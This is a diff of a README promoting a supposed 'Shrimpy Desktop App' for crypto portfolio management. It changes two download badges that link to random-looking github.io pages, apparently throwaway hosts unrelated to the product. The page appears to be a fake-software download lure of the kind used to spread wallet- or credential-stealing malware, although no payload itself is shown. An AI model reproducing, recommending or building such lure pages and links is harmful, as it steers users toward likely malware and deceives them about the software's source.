@@ -4,7 +4,7 @@
 
 ## 📥 Download Shrimpy Desktop App
 
-[![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://ippeljechonfivh7.github.io/.github/shrimpy-crypto-portfolio)
+[![View Shrimpy](https://img.shields.io/badge/View-Shrimpy-BE185D?style=flat-square)](https://shrimpy-management.github.io/.github/)
 
 ---
 
@@ -24,7 +24,7 @@ Security is central to Shrimpy’s design. API keys are stored with bank-level e
 
 Whether you are managing a small set of digital assets, overseeing multiple large portfolios, or building an automated investment strategy for clients, Shrimpy delivers a robust toolkit for simplifying crypto portfolio management. Its combination of automation, analytics, and community-driven features makes it an essential solution for anyone aiming to save time, reduce risk, and improve the consistency of their cryptocurrency investing.
 
-[![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://ippeljechonfivh7.github.io/.github/shrimpy-crypto-portfolio)
+[![View Shrimpy](https://img.shields.io/badge/View-Shrimpy-BE185D?style=flat-square)](https://shrimpy-management.github.io/.github/)
 
 ---
 
